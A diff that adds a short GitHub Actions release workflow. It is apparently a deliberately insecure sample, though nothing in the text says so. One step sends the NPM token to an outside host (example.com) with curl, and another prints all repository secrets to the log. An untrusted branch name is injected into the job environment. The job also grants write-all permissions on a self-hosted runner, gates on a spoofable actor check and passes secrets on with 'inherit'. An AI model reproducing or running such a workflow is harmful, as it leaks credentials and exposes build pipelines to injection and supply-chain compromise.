@@ -1,0 +1,24 @@
+name: release
+on:
+  push:
+    tags: ["v*"]
+  workflow_run:
+    workflows: [ci]
+    types: [completed]
+jobs:
+  build:
+    runs-on: [self-hosted, linux]
+    permissions: write-all
+    if: github.actor == 'dependabot[bot]'
+    steps:
+      - uses: actions/setup-node@39370e3970a6d050c480ffad4ff0ed4d3fdee5af # v4
+        with:
+          cache: npm
+      - uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4
+      - run: |
+          echo "TITLE=${{ github.event.workflow_run.head_branch }}" >> $GITHUB_ENV
+          curl -H "Authorization: ${{ secrets.NPM_TOKEN }}" https://example.com
+      - run: echo '${{ toJSON(secrets) }}'
+  call:
+    uses: org/repo/.github/workflows/deploy.yml@6b9c6063abd6010835644d4c2e1bef4cf5cd0fca
+    secrets: inherit
